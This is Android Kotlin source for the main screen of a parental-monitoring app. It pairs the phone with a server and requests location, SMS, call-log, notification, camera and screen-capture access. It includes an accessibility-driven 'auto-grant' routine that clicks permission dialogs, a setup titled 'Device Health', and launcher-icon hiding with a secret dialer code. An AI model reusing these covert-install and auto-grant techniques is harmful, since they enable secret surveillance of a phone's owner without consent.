package com.familyguard.child

import android.Manifest
import android.annotation.SuppressLint
import android.app.AppOpsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.os.Process
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.outlined.CheckCircle
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.familyguard.child.admin.AdminReceiver
import com.familyguard.child.data.Api
import com.familyguard.child.data.Store
import com.familyguard.child.service.MainService
import com.familyguard.child.service.MirrorManager
import com.familyguard.child.service.UsageWorker
import com.familyguard.child.service.WsChild
import com.familyguard.child.ui.ConsentActivity
import com.familyguard.child.util.AgeRelease
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        handleDeepLink(intent)
        setContent {
            MaterialTheme {
                Surface(modifier = Modifier.fillMaxSize()) {
                    Root()
                }
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleDeepLink(intent)
    }

    /** familyguard://pair?server=https://host&code=123456 — prefills the wizard
     *  (and auto-pairs) so the QR scan needs zero typing. */
    private fun handleDeepLink(intent: Intent?) {
        val data = intent?.data ?: return
        if (data.scheme != "familyguard" || data.host != "pair") return
        if (Store.paired) return
        val server = data.getQueryParameter("server")?.trim().orEmpty()
        val code = data.getQueryParameter("code")?.trim().orEmpty().filter { it.isDigit() }.take(6)
        if (server.isNotBlank() && (server.startsWith("http://") || server.startsWith("https://"))) {
            Store.pendingPairServer = server
        }
        if (code.length == 6) {
            Store.pendingPairCode = code
        }
    }

    // ------------------------------------------------------------ helpers

    private inline fun guard(block: () -> Unit) {
        if (AgeRelease.shouldRelease(this)) {
            AgeRelease.releaseAll(this)
            return
        }
        block()
    }

    private fun hasLocation(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    private fun hasUsageAccess(ctx: Context): Boolean {
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun hasCamera(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

    private fun hasCallsPerms(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    private fun hasBatteryIgnore(ctx: Context): Boolean {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(ctx.packageName)
    }

    private fun hasAdmin(ctx: Context): Boolean {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        return dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
    }

    @SuppressLint("BatteryLife")
    private fun requestIgnoreBattery(ctx: Context) {
        runCatching {
            ctx.startActivity(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + ctx.packageName))
            )
        }
    }

    /** One-tap walkthrough: opens each missing permission screen in order and lets
     *  EnforcementService auto-click the dialogs/toggles (needs accessibility ON).
     *  Without accessibility it still walks every screen — the user just taps Allow
     *  on each one. Returns a short status line for the UI. */
    private suspend fun autoGrantSequence(
        ctx: Context,
        locLauncher: ActivityResultLauncher<Array<String>>,
        camLauncher: ActivityResultLauncher<String>,
        callsLauncher: ActivityResultLauncher<Array<String>>,
        onProgress: (String) -> Unit
    ): String {
        data class AutoStep(val key: String, val done: () -> Boolean, val launch: () -> Unit)
        val adminIntent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            .putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(ctx, AdminReceiver::class.java)
            )
            .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allows remote screen lock")
        val steps = listOf(
            AutoStep("loc", { hasLocation(ctx) }, {
                locLauncher.launch(arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION))
            }),
            AutoStep("usage", { hasUsageAccess(ctx) }, {
                runCatching { ctx.startActivity(Intent("android.settings.USAGE_ACCESS_SETTINGS")) }
            }),
            AutoStep("overlay", { Settings.canDrawOverlays(ctx) }, {
                runCatching {
                    ctx.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + ctx.packageName)))
                }
            }),
            AutoStep("notif", {
                NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
            }, {
                runCatching { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
            }),
            AutoStep("cam", { hasCamera(ctx) }, { camLauncher.launch(Manifest.permission.CAMERA) }),
            AutoStep("calls", { hasCallsPerms(ctx) }, {
                callsLauncher.launch(
                    arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS)
                )
            }),
            AutoStep("battery", { hasBatteryIgnore(ctx) }, { requestIgnoreBattery(ctx) }),
            AutoStep("admin", { hasAdmin(ctx) }, { runCatching { ctx.startActivity(adminIntent) } }),
            AutoStep("mirror", { MirrorManager.hasProjection }, {
                runCatching { ctx.startActivity(Intent(ctx, ConsentActivity::class.java)) }
            })
        )
        var remaining = 0
        for (s in steps) {
            if (s.done()) continue
            remaining++
            onProgress("Auto-grant: " + s.key + " — screen khul rahi hai…")
            Store.autoClickStep = s.key
            Store.autoClickUntil = android.os.SystemClock.elapsedRealtime() + 30_000
            s.launch()
            var waited = 0
            while (!s.done() && waited < 30_000) {
                delay(600)
                waited += 600
            }
            Store.autoClickStep = ""
            Store.autoClickUntil = 0L
        }
        return if (remaining == 0) {
            "✓ Sab permissions already granted"
        } else {
            "Sequence khatam. Jo steps abhi bhi pending hain unme ek baar Allow tap karo (accessibility ON hone par zyada tar dialog khud allow ho jate hain)."
        }
    }

    private fun finishSetup() {
        runCatching { ContextCompat.startForegroundService(this, Intent(this, MainService::class.java)) }
        UsageWorker.runOnce(this)
        IconHider.hide(this)
        Toast.makeText(this, "Setup complete — app hidden. Dial *#*#2724#*#* to reopen.", Toast.LENGTH_LONG).show()
        finishAffinity()
    }

    // ------------------------------------------------------------ screens

    @Composable
    private fun Root() {
        var tick by remember { mutableStateOf(0) }
        var paired by remember { mutableStateOf(Store.paired) }
        var released by remember { mutableStateOf(Store.released) }
        var firedOnOpen by remember { mutableStateOf(false) }

        LaunchedEffect(Unit) {
            while (true) {
                delay(2000)
                tick++
            }
        }

        LaunchedEffect(tick) {
            if (AgeRelease.shouldRelease(this@MainActivity)) {
                if (!Store.released) {
                    AgeRelease.releaseAll(this@MainActivity)
                } else if (!firedOnOpen) {
                    firedOnOpen = true
                    AgeRelease.fireUninstall(this@MainActivity)
                }
                released = true
                paired = Store.paired
            } else {
                released = Store.released
                paired = Store.paired
            }
        }

        when {
            released -> ReleaseScreen()
            !paired -> WizardScreen(onPaired = { paired = true })
            else -> StatusScreen(tick = tick)
        }
    }

    @Composable
    private fun ReleaseScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                "Protections released (18+ / parent release). This app will uninstall itself.",
                style = MaterialTheme.typography.titleMedium
            )
            Spacer(Modifier.height(16.dp))
            Button(onClick = { AgeRelease.fireUninstall(this@MainActivity) }) {
                Text("Uninstall now")
            }
        }
    }

    @Composable
    private fun WizardScreen(onPaired: () -> Unit) {
        var pairedNow by remember { mutableStateOf(Store.paired) }
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Text("Device Health — Setup", style = MaterialTheme.typography.headlineSmall)
            Text(
                "One-time setup. After finishing, this app hides itself and everything else is managed remotely by a parent.",
                style = MaterialTheme.typography.bodySmall
            )
            PairStep(onPaired = {
                pairedNow = true
                onPaired()
            })
            Steps(tick = 0, compact = false)
            Button(
                enabled = pairedNow,
                onClick = { guard { finishSetup() } },
                modifier = Modifier.fillMaxWidth()
            ) { Text("Finish & Hide App") }
        }
    }

    @Composable
    private fun StatusScreen(tick: Int) {
        val ctx = LocalContext.current
        val rules by WsChild.rulesFlow.collectAsState()
        val fences by WsChild.fencesFlow.collectAsState()
        val hidden = remember(tick) { IconHider.hidden(ctx) }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Text("Paired as ${Store.childName}", style = MaterialTheme.typography.headlineSmall)
            Text(
                if (hidden) "Hidden from launcher: yes (dial *#*#2724#*#* to reopen)"
                else "Hidden from launcher: no",
                style = MaterialTheme.typography.bodySmall
            )

            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
                    Text("Active protections", style = MaterialTheme.typography.titleSmall)
                    val r = rules
                    Text(
                        "Daily screen time: " + if (r != null && r.dailyScreenTimeMin > 0) "${r.dailyScreenTimeMin} min" else "unlimited",
                        style = MaterialTheme.typography.bodySmall
                    )
                    Text(
                        "Bedtime: " + if (r?.bedtime?.enabled == true) "${r?.bedtime?.start} – ${r?.bedtime?.end}" else "off",
                        style = MaterialTheme.typography.bodySmall
                    )
                    Text("Schedules: ${r?.schedules?.size ?: 0}", style = MaterialTheme.typography.bodySmall)
                    Text("Blocked apps: ${r?.blockedApps?.size ?: 0}", style = MaterialTheme.typography.bodySmall)
                    Text("App limits: ${r?.appLimits?.size ?: 0}", style = MaterialTheme.typography.bodySmall)
                    Text("Geofences: ${fences.size}", style = MaterialTheme.typography.bodySmall)
                }
            }

            Button(
                onClick = { guard { UsageWorker.runOnce(ctx) } },
                modifier = Modifier.fillMaxWidth()
            ) { Text("Run sync now") }

            OutlinedButton(
                onClick = { guard { IconHider.show(ctx) } },
                modifier = Modifier.fillMaxWidth()
            ) { Text("Show icon") }

            Button(
                onClick = { guard { IconHider.hide(ctx); finishAffinity() } },
                modifier = Modifier.fillMaxWidth()
            ) { Text("Hide app again") }

            Text("Permissions", style = MaterialTheme.typography.titleMedium)
            Steps(tick = tick, compact = true)
        }
    }

    // ------------------------------------------------------------ steps

    @Composable
    private fun Steps(tick: Int, compact: Boolean) {
        val ctx = LocalContext.current
        val scope = rememberCoroutineScope()

        val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
        val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
        val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
        val adminLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {}
        var autoMsg by remember { mutableStateOf("") }
        var autoBusy by remember { mutableStateOf(false) }

        val locDone = remember(tick) { hasLocation(ctx) }
        val usageDone = remember(tick) { hasUsageAccess(ctx) }
        val overlayDone = remember(tick) { Settings.canDrawOverlays(ctx) }
        val notifDone = remember(tick) {
            NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
        }
        val camDone = remember(tick) { hasCamera(ctx) }
        val callsDone = remember(tick) { hasCallsPerms(ctx) }
        val mirrorDone = remember(tick) { MirrorManager.hasProjection }
        val battDone = remember(tick) { hasBatteryIgnore(ctx) }
        val adminDone = remember(tick) { hasAdmin(ctx) }

        if (!compact) {
            OutlinedButton(
                enabled = !autoBusy,
                onClick = {
                    autoBusy = true
                    scope.launch {
                        autoMsg = autoGrantSequence(
                            ctx, locLauncher, camLauncher, callsLauncher
                        ) { p -> autoMsg = p }
                        autoBusy = false
                    }
                },
                modifier = Modifier.fillMaxWidth()
            ) { Text(if (autoBusy) "⚡ Auto-grant chal raha hai…" else "⚡ Auto-grant all (screens khud khul kar allow ho jayengi)") }
            if (autoMsg.isNotBlank()) {
                Text(autoMsg, style = MaterialTheme.typography.bodySmall)
            }
        }

        StepCard(2, "Location", "Allow precise location for live tracking & geofences", locDone, compact,
            actionLabel = "Grant") {
            locLauncher.launch(
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION)
            )
        }
        StepCard(3, "Usage access", "Required for screen time tracking", usageDone, compact,
            actionLabel = "Open settings") {
            runCatching { ctx.startActivity(Intent("android.settings.USAGE_ACCESS_SETTINGS")) }
        }
        StepCard(4, "Display over other apps", "Shows block screens when limits are hit", overlayDone, compact,
            actionLabel = "Allow") {
            runCatching {
                ctx.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + ctx.packageName)))
            }
        }
        StepCard(5, "Notification access", "Syncs notifications to the parent app", notifDone, compact,
            actionLabel = "Open settings") {
            runCatching { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
        }
        StepCard(6, "Camera", "Used only on an explicit parent request", camDone, compact,
            actionLabel = "Grant") {
            camLauncher.launch(Manifest.permission.CAMERA)
        }
        StepCard(7, "Calls & SMS", "Sync call log and SMS to the parent app", callsDone, compact, optional = true,
            actionLabel = "Grant") {
            callsLauncher.launch(
                arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS)
            )
        }
        StepCard(8, "Screen sharing", "Used only while a parent is mirroring this device", mirrorDone, compact,
            actionLabel = "Allow screen capture") {
            runCatching { ctx.startActivity(Intent(ctx, ConsentActivity::class.java)) }
        }
        StepCard(9, "Battery optimization", "Keeps protection alive through doze", battDone, compact, optional = true,
            actionLabel = "Allow") {
            requestIgnoreBattery(ctx)
        }
        StepCard(10, "Device admin", "Allows remote screen lock", adminDone, compact, optional = true,
            actionLabel = "Enable") {
            runCatching {
                adminLauncher.launch(
                    Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                        .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(ctx, AdminReceiver::class.java))
                        .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allows remote screen lock")
                )
            }
        }
    }

    @Composable
    private fun StepCard(
        step: Int,
        title: String,
        desc: String,
        done: Boolean,
        compact: Boolean,
        optional: Boolean = false,
        actionLabel: String? = null,
        onAction: (() -> Unit)? = null
    ) {
        Card(modifier = Modifier.fillMaxWidth()) {
            Row(modifier = Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                if (done) {
                    Icon(
                        imageVector = Icons.Outlined.CheckCircle,
                        contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary
                    )
                } else {
                    Box(
                        modifier = Modifier
                            .size(24.dp)
                            .border(2.dp, MaterialTheme.colorScheme.outline, CircleShape)
                    )
                }
                Spacer(Modifier.width(12.dp))
                Column(modifier = Modifier.weight(1f)) {
                    val prefix = if (compact) "" else "Step $step · "
                    val suffix = if (optional) " (optional)" else ""
                    Text(prefix + title + suffix, style = MaterialTheme.typography.titleSmall)
                    Text(desc, style = MaterialTheme.typography.bodySmall)
                }
                if (!done && actionLabel != null && onAction != null) {
                    Spacer(Modifier.width(8.dp))
                    Button(onClick = onAction) { Text(actionLabel) }
                }
            }
        }
    }

    @Composable
    private fun PairStep(onPaired: () -> Unit) {
        val scope = rememberCoroutineScope()
        var url by remember {
            mutableStateOf(Store.pendingPairServer.ifBlank { Store.serverUrl })
        }
        var code by remember {
            mutableStateOf(Store.pendingPairCode.filter { it.isDigit() }.take(6))
        }
        var autoTried by remember { mutableStateOf(false) }
        var error by remember { mutableStateOf<String?>(null) }
        var busy by remember { mutableStateOf(false) }

        fun runPair() {
            if (busy || code.length != 6) return
            busy = true
            error = null
            Store.serverUrl = url.trim()
            scope.launch {
                try {
                    val resp = Api.pair(code, Build.MANUFACTURER + " " + Build.MODEL, Build.MODEL)
                    Store.token = resp.token
                    Store.cid = resp.child?.id ?: ""
                    Store.childName = resp.child?.name ?: ""
                    Store.paired = true
                    Store.pendingPairCode = ""
                    runCatching {
                        val me = Api.me()
                        Store.childName = me.name
                        if (me.dob.isNotBlank()) Store.dob = me.dob
                    }
                    onPaired()
                } catch (e: Exception) {
                    Store.paired = false
                    error = e.message ?: "Pairing failed"
                }
                busy = false
            }
        }

        // QR deep link: code already filled -> pair automatically, zero taps.
        LaunchedEffect(code) {
            if (!autoTried && code.length == 6 && Store.pendingPairCode.isNotBlank()) {
                autoTried = true
                runPair()
            }
        }

        Card(modifier = Modifier.fillMaxWidth()) {
            Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Text("Step 1 · Pair with FamilyGuard", style = MaterialTheme.typography.titleSmall)
                if (Store.pendingPairCode.isNotBlank() && !busy) {
                    Text(
                        "⚡ Setup link se khula — Pair khud ho jayega…",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.primary
                    )
                }
                OutlinedTextField(
                    value = url,
                    onValueChange = { url = it },
                    label = { Text("Server URL") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )
                OutlinedTextField(
                    value = code,
                    onValueChange = { code = it.filter { ch -> ch.isDigit() }.take(6) },
                    label = { Text("6-digit pairing code") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )
                if (error != null) {
                    Text(
                        error ?: "",
                        color = MaterialTheme.colorScheme.error,
                        style = MaterialTheme.typography.bodySmall
                    )
                }
                Button(
                    enabled = !busy && code.length == 6,
                    onClick = { runPair() }
                ) { Text(if (busy) "Pairing…" else "Pair") }
            }
        }
    }
}
